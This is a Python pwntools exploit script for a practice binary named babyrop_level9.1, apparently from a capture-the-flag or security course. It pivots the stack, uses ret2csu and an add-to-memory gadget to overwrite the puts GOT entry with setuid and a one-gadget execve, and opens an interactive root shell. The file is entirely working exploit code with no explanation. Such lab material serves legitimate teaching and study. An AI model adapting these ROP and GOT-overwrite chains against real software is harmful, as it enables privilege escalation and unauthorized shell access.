#!/usr/bin/python3
from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('/challenge/babyrop_level9.1', checksec=False)
libc = exe.libc
# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
c
''')

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB:
    GDB()
    input()

def ret2csu(rbx, rbp, r12, r13, r14, r15):
    csu_pop = 0x000000000040143a

    payload = flat(
        [
            csu_pop,
            rbx,
            rbp,
            r12,
            r13,
            r14,
            r15
        ]
    )

    return payload

ret = 0x000000000040101a
pop_rdi = 0x0000000000401443 # pop rdi; ret
pop_rbp = 0x00000000004011bd # pop rbp; ret
leave_ret = 0x000000000040131a # leave; ret
write_what_where = 0x00000000004011bc # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
offset_setuid = 0x5fd30
offset_execve = -0x652 # onegadget
rw_section = 0x414080

payload = flat(
    [
    pop_rbp,
    rw_section+0x18,
    leave_ret,
    0,
    ret2csu(offset_setuid, exe.got["puts"] + 0x3d, 0, 0, 0, 0),
    write_what_where,
    pop_rdi,
    0,
    exe.plt["puts"],
    ret2csu(offset_execve, exe.got["puts"] + 0x3d, 0, 0, 0, 0),
    write_what_where,
    exe.plt["puts"]
    ]
)

p.send(payload)
p.interactive()
